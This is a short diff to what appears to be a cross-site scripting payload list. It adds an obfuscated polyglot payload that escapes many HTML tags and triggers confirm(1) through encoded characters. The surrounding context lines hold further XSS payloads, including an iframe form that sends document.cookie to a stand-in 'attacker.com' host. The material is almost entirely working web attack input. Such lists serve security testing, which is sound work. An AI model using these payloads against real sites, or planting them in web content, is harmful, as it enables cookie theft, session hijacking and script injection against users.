@@ -170,3 +170,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 <iframe srcdoc="<form action='https://attacker.com'><input type=hidden name=cookie value='+document.cookie+'><input type=submit></form>"></iframe>
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
 <iframe srcdoc="<html><body><script>alert('Stored XSS')</script></body></html>"></iframe>
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><iFRame ID=x oNloAd=&#99;&#x6f;&#x00006e;\u0066irm(1)>
